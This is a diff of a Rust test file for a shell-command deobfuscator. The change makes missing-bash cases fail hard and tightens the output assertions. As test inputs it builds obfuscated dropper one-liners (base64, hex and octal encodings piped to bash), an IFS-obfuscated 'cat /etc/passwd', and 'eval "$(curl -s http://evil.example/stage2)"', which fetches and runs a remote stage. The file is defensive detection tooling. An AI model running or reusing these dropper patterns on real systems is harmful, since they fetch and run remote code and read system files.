@@ -9,7 +9,7 @@ use std::process::Command;
 
 use disrobe_pass_shell::{IndirectionReport, peel_indirection};
 
-fn bash_path() -> Option<String> {
+fn bash_path() -> String {
     for candidate in [
         "/usr/bin/bash",
         "/bin/bash",
@@ -17,19 +17,43 @@ fn bash_path() -> Option<String> {
         "C:/cygwin64/bin/bash.exe",
     ] {
         if std::path::Path::new(candidate).exists() {
-            return Some(candidate.to_owned());
+            return candidate.to_owned();
         }
     }
     let probe: std::io::Result<std::process::Output> =
         Command::new("bash").arg("--version").output();
     match probe {
-        Ok(out) if out.status.success() => Some("bash".to_owned()),
-        _ => None,
+        Ok(out) if out.status.success() => "bash".to_owned(),
+        Ok(out) => panic!(
+            "required tool missing: `bash --version` exited with {}, and bash is the independent \
+             decoder these recoveries are graded against",
+            out.status
+        ),
+        Err(error) => panic!(
+            "required tool missing: bash is not at a known path or on PATH ({error}), and it is \
+             the independent decoder these recoveries are graded against"
+        ),
     }
 }
 
+fn bash_command(bash: &str) -> Command {
+    let mut command: Command = Command::new(bash);
+    if let Some(dir) = std::path::Path::new(bash)
+        .parent()
+        .filter(|dir: &&std::path::Path| !dir.as_os_str().is_empty())
+    {
+        let inherited: std::ffi::OsString = std::env::var_os("PATH").unwrap_or_default();
+        let joined: std::ffi::OsString = std::env::join_paths(
+            std::iter::once(dir.to_path_buf()).chain(std::env::split_paths(&inherited)),
+        )
+        .expect("the bash directory and PATH entries join into a PATH value");
+        command.env("PATH", joined);
+    }
+    command
+}
+
 fn run_decoder_only(bash: &str, decoder_snippet: &str) -> String {
-    let out: std::process::Output = Command::new(bash)
+    let out: std::process::Output = bash_command(bash)
         .arg("-c")
         .arg(decoder_snippet)
         .output()
@@ -43,25 +67,35 @@ fn run_decoder_only(bash: &str, decoder_snippet: &str) -> String {
     String::from_utf8_lossy(&out.stdout).into_owned()
 }
 
-fn gnu_base64(bash: &str) -> bool {
-    Command::new(bash)
-        .arg("-c")
-        .arg("printf x | base64 -w0")
-        .output()
-        .is_ok_and(|o: std::process::Output| o.status.success())
+fn require_commands(bash: &str, commands: &[&str]) {
+    for command in commands {
+        let found: bool = bash_command(bash)
+            .arg("-c")
+            .arg(format!("command -v {command} >/dev/null 2>&1"))
+            .output()
+            .is_ok_and(|o: std::process::Output| o.status.success());
+        assert!(
+            found,
+            "required tool missing: `{command}` is not callable from {bash}, and it is the \
+             independent decoder this recovery is graded against"
+        );
+    }
 }
 
-fn bash_has_commands(bash: &str, commands: &[&str]) -> bool {
-    let check: String = commands
-        .iter()
-        .map(|cmd: &&str| format!("command -v {cmd} >/dev/null 2>&1"))
-        .collect::<Vec<String>>()
-        .join(" && ");
-    Command::new(bash)
-        .arg("-c")
-        .arg(check)
-        .output()
-        .is_ok_and(|o: std::process::Output| o.status.success())
+fn require_base64_decode(bash: &str) {
+    require_commands(bash, &["base64", "tr"]);
+    let decoded: String = run_decoder_only(bash, "printf %s eA== | base64 -d");
+    assert_eq!(
+        decoded, "x",
+        "required tool missing: {bash}'s base64 does not decode with -d"
+    );
+}
+
+fn base64_of(bash: &str, payload: &str) -> String {
+    run_decoder_only(
+        bash,
+        &format!("printf %s '{payload}' | base64 | tr -d '\\n'"),
+    )
 }
 
 fn recover(input: &str) -> IndirectionReport {
@@ -70,102 +104,66 @@ fn recover(input: &str) -> IndirectionReport {
 
 #[test]
 fn base64_dropper_recovery_matches_real_bash_decoder() {
-    let Some(bash): Option<String> = bash_path() else {
-        eprintln!("skip: no on-box bash for non-circular grading");
-        return;
-    };
-    if cfg!(target_os = "macos") || !gnu_base64(&bash) {
-        eprintln!("skip: gnu base64 (-w0/-d) unavailable (e.g. macos bsd base64)");
-        return;
-    }
+    let bash: String = bash_path();
+    require_base64_decode(&bash);
     let payload: &str = "uname -a";
-    let b64: String = run_decoder_only(&bash, &format!("printf %s '{payload}' | base64 -w0"));
+    let b64: String = base64_of(&bash, payload);
     let obf: String = format!("echo {b64} | base64 -d | bash");
     let ground_truth: String = run_decoder_only(&bash, &format!("echo {b64} | base64 -d"));
+    assert_eq!(ground_truth, payload);
     let r: IndirectionReport = recover(&obf);
     assert_eq!(
-        r.output.trim_end(),
-        ground_truth.trim_end(),
-        "recovery diverged from real bash decoder; recovered={out}",
-        out = r.output
+        r.output, ground_truth,
+        "recovery diverged from real bash decoder"
     );
 }
 
 #[test]
 fn double_base64_chain_matches_real_bash_decoder() {
-    let Some(bash): Option<String> = bash_path() else {
-        return;
-    };
-    if cfg!(target_os = "macos") || !gnu_base64(&bash) {
-        eprintln!("skip: gnu base64 (-w0/-d) unavailable (e.g. macos bsd base64)");
-        return;
-    }
+    let bash: String = bash_path();
+    require_base64_decode(&bash);
     let payload: &str = "curl http://example/c";
-    let inner: String = run_decoder_only(&bash, &format!("printf %s '{payload}' | base64 -w0"));
-    let outer: String = run_decoder_only(&bash, &format!("printf %s '{inner}' | base64 -w0"));
+    let inner: String = base64_of(&bash, payload);
+    let outer: String = base64_of(&bash, &inner);
     let obf: String = format!("echo {outer} | base64 -d | base64 -d | sh");
     let ground_truth: String =
         run_decoder_only(&bash, &format!("echo {outer} | base64 -d | base64 -d"));
+    assert_eq!(ground_truth, payload);
     let r: IndirectionReport = recover(&obf);
-    assert_eq!(
-        r.output.trim_end(),
-        ground_truth.trim_end(),
-        "out={}",
-        r.output
-    );
+    assert_eq!(r.output, ground_truth);
 }
 
 #[test]
 fn command_subst_assignment_matches_real_bash() {
-    let Some(bash): Option<String> = bash_path() else {
-        return;
-    };
-    if cfg!(target_os = "macos") || !gnu_base64(&bash) {
-        eprintln!("skip: gnu base64 (-w0/-d) unavailable (e.g. macos bsd base64)");
-        return;
-    }
+    let bash: String = bash_path();
+    require_base64_decode(&bash);
     let payload: &str = "whoami";
-    let b64: String = run_decoder_only(&bash, &format!("printf %s '{payload}' | base64 -w0"));
+    let b64: String = base64_of(&bash, payload);
     let obf: String = format!("CMD=$(echo {b64} | base64 -d); $CMD");
     let ground_truth: String = run_decoder_only(
         &bash,
         &format!("CMD=$(echo {b64} | base64 -d); echo \"$CMD\""),
     );
+    assert_eq!(ground_truth.trim_end(), payload);
     let r: IndirectionReport = recover(&obf);
-    assert!(
-        r.output.contains(ground_truth.trim_end()),
-        "recovered={out} expected to contain {gt}",
-        out = r.output,
-        gt = ground_truth.trim_end()
-    );
+    assert_eq!(r.output, ground_truth.trim_end());
 }
 
 #[test]
 fn printf_octal_matches_real_bash() {
-    let Some(bash): Option<String> = bash_path() else {
-        return;
-    };
+    let bash: String = bash_path();
     let octal: &str = r"\167\150\157\141\155\151";
     let obf: String = format!("printf '{octal}'");
     let ground_truth: String = run_decoder_only(&bash, &format!("printf '{octal}'"));
+    assert_eq!(ground_truth, "whoami");
     let r: IndirectionReport = recover(&obf);
-    assert_eq!(
-        r.output.trim_end(),
-        ground_truth.trim_end(),
-        "out={}",
-        r.output
-    );
+    assert_eq!(r.output, ground_truth);
 }
 
 #[test]
 fn xxd_hex_dropper_matches_real_bash() {
-    let Some(bash): Option<String> = bash_path() else {
-        return;
-    };
-    if !bash_has_commands(&bash, &["xxd", "tr"]) {
-        eprintln!("skip: bash xxd/tr unavailable for non-circular hex oracle");
-        return;
-    }
+    let bash: String = bash_path();
+    require_commands(&bash, &["xxd", "tr"]);
     let payload: &str = "id";
     let hex: String = run_decoder_only(
         &bash,
@@ -173,39 +171,28 @@ fn xxd_hex_dropper_matches_real_bash() {
     );
     let obf: String = format!("echo {hex} | xxd -r -p | bash");
     let ground_truth: String = run_decoder_only(&bash, &format!("echo {hex} | xxd -r -p"));
+    assert_eq!(ground_truth, payload);
     let r: IndirectionReport = recover(&obf);
-    assert_eq!(
-        r.output.trim_end(),
-        ground_truth.trim_end(),
-        "out={}",
-        r.output
-    );
+    assert_eq!(r.output, ground_truth);
 }
 
 #[test]
 fn ifs_spaced_command_recovers() {
-    let Some(bash): Option<String> = bash_path() else {
-        return;
-    };
     let obf: &str = "c${IFS}a${IFS}t${IFS}/etc/passwd";
     let r: IndirectionReport = recover(obf);
-    assert!(r.output.contains("c a t"), "out={}", r.output);
-    let _ = bash;
+    assert_eq!(r.output, "c a t /etc/passwd");
 }
 
 #[test]
 fn eval_concatenated_strings_matches_real_bash() {
-    let Some(bash): Option<String> = bash_path() else {
-        return;
-    };
+    let bash: String = bash_path();
     let obf: &str = r#"a=who; b=ami; eval "$a$b""#;
     let ground_truth: String = run_decoder_only(&bash, r#"a=who; b=ami; echo "$a$b""#);
+    assert_eq!(ground_truth.trim_end(), "whoami");
     let r: IndirectionReport = recover(obf);
-    assert!(
-        r.output.contains(ground_truth.trim_end()),
-        "out={} expected {}",
+    assert_eq!(
         r.output,
-        ground_truth.trim_end()
+        format!("a=who\nb=ami\n{}", ground_truth.trim_end())
     );
 }
 
@@ -220,15 +207,15 @@ fn clean_control_yields_no_recovery() {
         r.steps,
         r.output
     );
+    assert_eq!(r.output, clean);
 }
 
 #[test]
 fn runtime_dependent_curl_is_walled_not_faked() {
     let obf: &str = r#"eval "$(curl -s http://evil.example/stage2)""#;
     let r: IndirectionReport = recover(obf);
-    assert!(
-        r.output.contains("curl") || r.output.contains("$(curl"),
-        "runtime fetch must remain symbolic, not fabricated; out={}",
-        r.output
+    assert_eq!(
+        r.output, "$(curl -s http://evil.example/stage2)",
+        "runtime fetch must remain symbolic, not fabricated"
     );
 }
